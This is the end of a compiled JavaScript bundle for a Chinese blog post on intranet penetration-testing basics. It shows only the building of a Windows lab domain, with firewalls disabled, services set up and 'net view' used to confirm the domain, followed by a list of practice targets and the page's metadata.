alt="image-20220711162913226"></p></blockquote><p><img src="'+f+'" alt="image-20220711163117542"></p><p>取消默认的账户禁用</p><p><img src="'+y+'" alt="image-20220712164509534"></p><h3 id="windows-7-配置" tabindex="-1"><a class="header-anchor" href="#windows-7-配置"><span>Windows 7 配置</span></a></h3><p>配置IP，DNS后，在命令行中 <code>ping hacke.testlab</code> 验证，是否成功添加到该域</p><p><img src="'+_+'" alt="image-20220712162630894"></p><p>更改计算机名称，并加入域</p><p>此时需要输入的安全认证为 Windows Server 2012 的 Administator 与密码（本地账户）</p><p><img src="'+B+'" alt="image-20220712162851294"></p><p><img src="'+C+'" alt="image-20220712162951530"></p><p>重启，并使用 <code>HACKE\\testuser</code> 登录</p><p><img src="'+E+'" alt="image-20220712164601444"></p><h3 id="windows-server-2008-配置" tabindex="-1"><a class="header-anchor" href="#windows-server-2008-配置"><span>Windows Server 2008 配置</span></a></h3><p>与 Win7 同理</p><p><img src="'+W+'" alt="image-20220712165743288"></p><p><img src="'+N+`" alt="image-20220712171044959"></p><h3 id="验证" tabindex="-1"><a class="header-anchor" href="#验证"><span>验证</span></a></h3><p>确认三台机器</p><ul><li><p>已加入域网络、</p></li><li><p>防火墙关闭、</p></li><li><p>Server ，WorkStation，Computer Browser 三项服务：自动并运行中</p><ul><li>PS: Computer Browser默认为手动状态，需要手动调节为自动（需要用管理员身份打开 services.msc 切换）</li></ul></li><li><p>重启</p></li></ul><p>此时，在任意一台机器上 <code>net view /domain:hacke</code> 可得到以下结果</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">Microsoft Windows <span class="token punctuation">[</span>版本 <span class="token number">6.3</span>.9600<span class="token punctuation">]</span></span>
<span class="line"><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2013</span> Microsoft Corporation。保留所有权利。</span>
<span class="line"></span>
<span class="line">C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>Administrator<span class="token operator">&gt;</span>net view /domain:hacke</span>
<span class="line">服务器名称            注解</span>
<span class="line"></span>
<span class="line">-------------------------------------------------------------------------------</span>
<span class="line"><span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC</span>
<span class="line"><span class="token punctuation">\\</span><span class="token punctuation">\\</span>WIN7-X64-TEST</span>
<span class="line"><span class="token punctuation">\\</span><span class="token punctuation">\\</span>WS08-X64-TEST</span>
<span class="line">命令成功完成。</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="其他服务器环境" tabindex="-1"><a class="header-anchor" href="#其他服务器环境"><span>其他服务器环境</span></a></h3><ul><li>Metasploitable2</li><li>Metasploitable3</li><li>OWASPBWA</li><li>DVWA</li></ul>`,50))])}const q=l(D,[["render",U]]),j=JSON.parse('{"path":"/blogs/tech/security/net/01_Internal_Penetration_Testing_Basics.html","title":"内网渗透测试基础","lang":"en-US","frontmatter":{"title":"内网渗透测试基础","date":"2023-10-09T00:00:00.000Z","tags":["security","networking"],"categories":["tech"]},"headers":[{"level":2,"title":"1.1 内网基础","slug":"_1-1-内网基础","link":"#_1-1-内网基础","children":[]},{"level":2,"title":"1.2 主机平台及常用工具","slug":"_1-2-主机平台及常用工具","link":"#_1-2-主机平台及常用工具","children":[{"level":3,"title":"1.2.1 虚拟机安装","slug":"_1-2-1-虚拟机安装","link":"#_1-2-1-虚拟机安装","children":[]},{"level":3,"title":"1.2.2 Kali Linux渗透测试平台及常用工具","slug":"_1-2-2-kali-linux渗透测试平台及常用工具","link":"#_1-2-2-kali-linux渗透测试平台及常用工具","children":[]},{"level":3,"title":"1.2.3 Windows 渗透测试平台及常用工具","slug":"_1-2-3-windows-渗透测试平台及常用工具","link":"#_1-2-3-windows-渗透测试平台及常用工具","children":[]},{"level":3,"title":"1.2.4 Windows Powershell 基础","slug":"_1-2-4-windows-powershell-基础","link":"#_1-2-4-windows-powershell-基础","children":[]}]},{"level":2,"title":"1.3 构建内网环境","slug":"_1-3-构建内网环境","link":"#_1-3-构建内网环境","children":[{"level":3,"title":"Windows Server 2012 配置","slug":"windows-server-2012-配置","link":"#windows-server-2012-配置","children":[]},{"level":3,"title":"Windows 7 配置","slug":"windows-7-配置","link":"#windows-7-配置","children":[]},{"level":3,"title":"Windows Server 2008 配置","slug":"windows-server-2008-配置","link":"#windows-server-2008-配置","children":[]},{"level":3,"title":"验证","slug":"验证","link":"#验证","children":[]},{"level":3,"title":"其他服务器环境","slug":"其他服务器环境","link":"#其他服务器环境","children":[]}]}],"git":{"createdTime":1766928673000,"updatedTime":1766928673000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/tech/security/net/01_Internal_Penetration_Testing_Basics.md"}');export{q as comp,j as data};
